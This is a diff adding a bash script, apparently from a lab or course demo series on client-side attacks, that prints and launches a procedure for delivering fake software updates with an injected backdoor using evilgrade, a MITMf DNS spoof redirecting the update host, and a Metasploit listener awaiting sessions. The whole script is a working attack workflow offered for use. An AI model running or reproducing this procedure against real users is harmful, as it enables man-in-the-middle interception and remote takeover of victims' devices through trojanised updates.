@@ -1,0 +1,27 @@
+#!/bin/bash
+
+echo "~~Script Description: This script is used to deliver fake updates to the victim, these updates will have our backdoor injected."
+echo "~~Attack Procedure:"
+echo "	1-THe backdoor generation and listener configuration will be done automatically."
+echo "	2-Use 'evilgrade' to choose the software you want to fake update by doing:
+		a-show modules : to see the supported software.
+		b-configure [software] name : to select the software you want.
+		c-show options : to see the required options.
+		d-set agent [backdoor path] : this is the most important option.
+	3-MOdify the mitmf configuration file by adding an A record as follow : [software Host website]=10.0.2.15.
+	4-A MITM attack will be started.
+	5-Execute the 'start' command in 'eveilgrade'.
+	6-GO to the target device, and check for updates using the software selected earlier.
+	7-INstall the updates.
+	8-Check metasploit listener for opened sessions."
+cd
+cd Desktop/Scripts/Demo-4-Client-Side-Attacks/
+gnome-terminal --tab -e './fake_updates-2'
+cd
+cd Downloads/evilgrade
+./evilgrade
+
+
+
+
+
